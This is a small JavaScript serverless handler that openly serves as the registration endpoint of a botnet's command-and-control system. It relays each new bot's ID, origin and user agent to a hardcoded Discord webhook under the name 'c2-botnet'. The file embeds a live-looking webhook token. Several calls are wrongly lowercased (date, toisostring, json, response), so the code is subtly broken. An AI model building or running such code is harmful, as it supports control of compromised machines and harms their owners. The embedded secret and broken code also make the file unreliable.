// api/register.js
export const config = { runtime: 'edge' };

const discord_webhook_url = 'https://discord.com/api/webhooks/1516092945067933797/tI4BBfCLmWm4IgcUk9_b3WiurJM5z1FWn1uJ33HcN0RcqTmQJlqU0aIXcaDQdz7S_6Or';

export default async function handler(req) {
    const { bot_id, origin, ua } = await req.json();
    const embed = {
        title: '💥 new bot online',
        color: 3066993, // green
        fields: [
            { name: 'bot id', value: `\`${bot_id}\`` },
            { name: 'origin', value: origin },
            { name: 'user agent', value: `\`${ua}\`` },
        ],
        timestamp: new date().toisostring(),
    };
    fetch(discord_webhook_url, {
        method: 'post',
        headers: { 'content-type': 'application/json' },
        body: json.stringify({ username: 'c2-botnet', embeds: [embed] }),
    });
    return new response(null, { status: 204 });
}
